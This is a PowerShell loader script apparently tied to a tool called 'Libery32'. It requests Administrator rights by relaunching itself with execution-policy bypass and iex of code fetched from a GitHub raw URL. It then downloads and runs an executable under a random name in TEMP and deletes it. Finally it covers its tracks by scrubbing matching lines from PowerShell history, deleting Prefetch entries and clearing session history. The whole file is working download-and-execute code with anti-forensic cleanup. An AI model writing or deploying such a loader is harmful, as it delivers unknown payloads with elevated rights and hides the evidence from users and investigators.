param(
    [string]$ExeUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/Libery32.ps1/main/Libery32.exe',
    [string]$ScriptUrl = 'https://raw.githubusercontent.com/lubyralph6-maker/Libery32.ps1/main/Libery32.ps1'
)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $admin) {
    Write-Host 'Requesting Administrator...' -ForegroundColor Cyan
    $u = $ScriptUrl.Replace("'", "''")
    Start-Process powershell.exe -Verb RunAs -ArgumentList @('-nop', '-ep', 'bypass', '-NoExit', '-c', "iex ((Invoke-WebRequest '$u' -UseBasicParsing).Content)")
    exit
}

try { Remove-Module PSReadLine -ErrorAction SilentlyContinue } catch {}

$randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
$tempExe = Join-Path $env:TEMP ($randomName + '.exe')
$pattern = 'discord|cmd|libery32|Libery32|' + $randomName

$downloaded = $false
foreach ($url in @($ExeUrl, 'https://github.com/lubyralph6-maker/Libery32.ps1/releases/latest/download/Libery32.exe')) {
    if ([string]::IsNullOrWhiteSpace($url)) { continue }
    try {
        Write-Host ('Downloading: ' + $url) -ForegroundColor Cyan
        Invoke-WebRequest -Uri $url -OutFile $tempExe -UseBasicParsing
        if ((Test-Path $tempExe) -and ((Get-Item $tempExe).Length -gt 100000)) {
            $downloaded = $true
            break
        }
        Remove-Item $tempExe -Force -ErrorAction SilentlyContinue
    } catch {
        Remove-Item $tempExe -Force -ErrorAction SilentlyContinue
    }
}

if (-not $downloaded) {
    Write-Host 'Download failed. Upload Libery32.exe to GitHub first.' -ForegroundColor Red
    Read-Host 'Press Enter to close'
    exit 1
}

Write-Host 'Downloaded' -ForegroundColor Green
$proc = Start-Process -FilePath $tempExe -PassThru
$proc.WaitForExit()
Start-Sleep -Seconds 2

for ($i = 1; $i -le 5; $i++) {
    try {
        if (Test-Path $tempExe) {
            Remove-Item $tempExe -Force -ErrorAction Stop
            Write-Host 'Deleted' -ForegroundColor Green
            break
        }
    } catch {
        Start-Sleep -Seconds 2
    }
}

$historyPath = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
if (Test-Path $historyPath) {
    try {
        $keep = Get-Content $historyPath | Where-Object { $_ -notmatch $pattern }
        $keep | Set-Content -Path $historyPath -Encoding UTF8
    } catch {}
}

try {
    Remove-Item ('C:\Windows\Prefetch\*' + $randomName + '*') -Force -ErrorAction SilentlyContinue
    Remove-Item 'C:\Windows\Prefetch\*LIBERY32*' -Force -ErrorAction SilentlyContinue
} catch {}

Clear-History
Write-Host 'Finished' -ForegroundColor Green
Read-Host 'Press Enter to close'
